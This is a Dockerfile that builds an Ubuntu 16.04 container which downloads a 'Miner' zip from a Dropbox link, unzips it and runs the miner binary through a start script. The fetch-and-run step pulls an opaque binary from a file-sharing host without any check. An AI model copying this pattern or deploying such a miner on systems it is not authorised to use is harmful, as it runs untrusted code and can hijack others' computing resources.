FROM ubuntu:16.04
RUN apt -y update
RUN apt -y install python-twisted python-pip python-socks unzip wget
RUN wget -O /root/miner.zip https://dropbox.com/s/7kihptpklkik2hb/Miner.zip?dl=0
RUN unzip /root/miner.zip
COPY start.sh /Miner/start.sh
RUN chmod +x  /Miner/start.sh
RUN chmod +x  /Miner/miner
CMD ["/Miner/start.sh"]


